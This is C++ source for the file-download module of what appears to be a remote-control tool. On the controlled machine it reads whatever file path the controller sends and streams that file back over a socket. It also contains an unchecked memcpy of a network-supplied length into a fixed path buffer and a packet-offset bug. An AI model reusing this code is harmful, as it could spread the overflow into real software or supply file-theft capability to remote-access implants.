#include "pch.h"
#include "ModuleFileDownload.h"


CModuleFileDownload::CModuleFileDownload(CSocketClient* pSocketClient) : CModule(pSocketClient) {
	// 自动重置事件，初始状态无信号
	m_hRecvPacketFileDownloadInfoEvent = CreateEvent(NULL, false, false, NULL);
	m_hRecvPacketFileDownloadCloseEvent = CreateEvent(NULL, false, false, NULL);

	m_hFile = NULL;
}


CModuleFileDownload::~CModuleFileDownload() {
	if (m_hRecvPacketFileDownloadInfoEvent != nullptr) {
		CloseHandle(m_hRecvPacketFileDownloadInfoEvent);
		m_hRecvPacketFileDownloadInfoEvent = nullptr;
	}

	if (m_hRecvPacketFileDownloadCloseEvent != nullptr) {
		CloseHandle(m_hRecvPacketFileDownloadCloseEvent);
		m_hRecvPacketFileDownloadCloseEvent = nullptr;
	}
	if (m_hFile) {
		CloseHandle(m_hFile);
		m_hFile = nullptr;
	}
}


typedef struct _THREAD_PARAM {
	CPacket*					m_pPacket;
	CModuleFileDownload*		m_pModuleFileDownload;
	_THREAD_PARAM(CPacket* pPacket, CModuleFileDownload* pModuleFileDownload) {
		m_pPacket = pPacket;
		m_pModuleFileDownload = pModuleFileDownload;
	}
}THREAD_PARAM;


// 重写虚函数
void CModuleFileDownload::OnRecvivePacket(CPacket* pPacket) {
	CPacket* pPacketCopy = new CPacket(*pPacket);					// 记得在线程函数里面delete这个包
	THREAD_PARAM* lParam = new THREAD_PARAM(pPacketCopy, this);

	switch (pPacket->m_PacketHead.wCommandId) {

	case FILE_DOWNLOAD_INFO:
		//SetEvent(m_hRecvPacketFileDownloadInfoEvent);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OnRecvPacketFileDownloadInfo, (LPVOID)lParam, 0, NULL);
		break;

	case FILE_DOWNLOAD_DATA:
		delete pPacketCopy;
		break;

	case FILE_DOWNLOAD_DATA_TAIL:
		delete pPacketCopy;
		break;

	case FILE_DOWNLOAD_CLOSE:
		SetEvent(m_hRecvPacketFileDownloadCloseEvent);
		delete pPacketCopy;
		break;
	}
}



BOOL WINAPI OnRecvPacketFileDownloadInfo(LPVOID lParam) {
	THREAD_PARAM* pThreadParam = (THREAD_PARAM*)lParam;
	CPacket* pPacket = pThreadParam->m_pPacket;
	CModuleFileDownload* pModuleFileDownload = pThreadParam->m_pModuleFileDownload;
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;

	// 接收到了主控端发来的INFO封包，包体：主控端请求下载的被控端文件的路径（MAX_PATH*2 字节）
	WCHAR pszLocalPath[MAX_PATH];
	memcpy(pModuleFileDownload->m_pszLocalPath, pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);

	if (lParam != nullptr) {
		delete lParam;
		lParam = nullptr;
	}

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}

	// 只有文件存在才打开文件
	pModuleFileDownload->m_hFile = CreateFile(pModuleFileDownload->m_pszLocalPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// 打开失败
	if (pModuleFileDownload->m_hFile == INVALID_HANDLE_VALUE) {
		// 被控端发往主控端的INFO包体：被控端文件状态（1字节）+ 文件大小（8字节）
		BYTE pbPacketBody[9];
		// TODO 暂时文件打开失败统一状态为0xff, 后续可能会区分文件不存在，文件被占用等不同状态
		pbPacketBody[0] = 0xff;			// 0xff表示文件打开失败
		WriteQwordToBuffer(pbPacketBody+1, 0, 1);
		pSocketClient->SendPacket(FILE_DOWNLOAD_INFO, pbPacketBody, 9);

		pModuleFileDownload->m_hFile = nullptr;
		return false;
	}

	// 获取文件大小
	QWORD qwFileSize = 0;
	DWORD dwFileSizeLowDword = 0;
	DWORD dwFileSizeHighDword = 0;
	dwFileSizeLowDword = GetFileSize(pModuleFileDownload->m_hFile, &dwFileSizeHighDword);
	qwFileSize = (((QWORD)dwFileSizeHighDword) << 32) + dwFileSizeLowDword;		// 直接dwFileSizeHighDword << 32的话就等于0了

	// 被控端发往主控端的INFO包体：被控端文件状态（1字节）+ 文件大小（8字节）
	BYTE pbPacketBody[9];
	ZeroMemory(pbPacketBody, sizeof(pbPacketBody));
	pbPacketBody[0] = 0;			// 0表示文件打开成功
	WriteQwordToBuffer(pbPacketBody, qwFileSize, 1);

	// 发回FILE_DOWNLOAD_INFO包
	pSocketClient->SendPacket(FILE_DOWNLOAD_INFO, pbPacketBody, 9);


	PBYTE pbBuffer = new BYTE[PACKET_BODY_MAX_LENGTH];
	DWORD dwPacketSplitNum = (qwFileSize % PACKET_BODY_MAX_LENGTH) ? qwFileSize / PACKET_BODY_MAX_LENGTH + 1 : qwFileSize / PACKET_BODY_MAX_LENGTH;
	DWORD dwBytesReadTemp = 0;

	// 上传文件数据
	for (DWORD dwSplitIndex = 0; dwSplitIndex < dwPacketSplitNum; dwSplitIndex++) {

		// 不是最后一个分片
		if (dwSplitIndex != dwPacketSplitNum - 1) {
			ReadFile(pModuleFileDownload->m_hFile, pbBuffer, PACKET_BODY_MAX_LENGTH, &dwBytesReadTemp, NULL);
			pSocketClient->SendPacket(FILE_DOWNLOAD_DATA, pbBuffer, PACKET_BODY_MAX_LENGTH);
		}
		// 最后一个分片
		else {
			DWORD dwReadBytes = qwFileSize % PACKET_BODY_MAX_LENGTH ? qwFileSize % PACKET_BODY_MAX_LENGTH : PACKET_BODY_MAX_LENGTH;
			ReadFile(pModuleFileDownload->m_hFile, pbBuffer, dwReadBytes, &dwBytesReadTemp, NULL);
			pSocketClient->SendPacket(FILE_DOWNLOAD_DATA_TAIL, pbBuffer, dwReadBytes);
		}
		dwBytesReadTemp = 0;
	}
	
	if (pModuleFileDownload->m_hFile != nullptr) {
		CloseHandle(pModuleFileDownload->m_hFile);
		pModuleFileDownload->m_hFile = nullptr;
	}
	

	if (pbBuffer != nullptr) {
		delete[] pbBuffer;
		pbBuffer = nullptr;
	}

	pSocketClient->SendPacket(FILE_DOWNLOAD_CLOSE, NULL, 0);

	WaitForSingleObject(pModuleFileDownload->m_hRecvPacketFileDownloadCloseEvent, INFINITE);

	if (pModuleFileDownload != nullptr) {
		delete pModuleFileDownload;
		pModuleFileDownload = nullptr;
	}

	return true;
}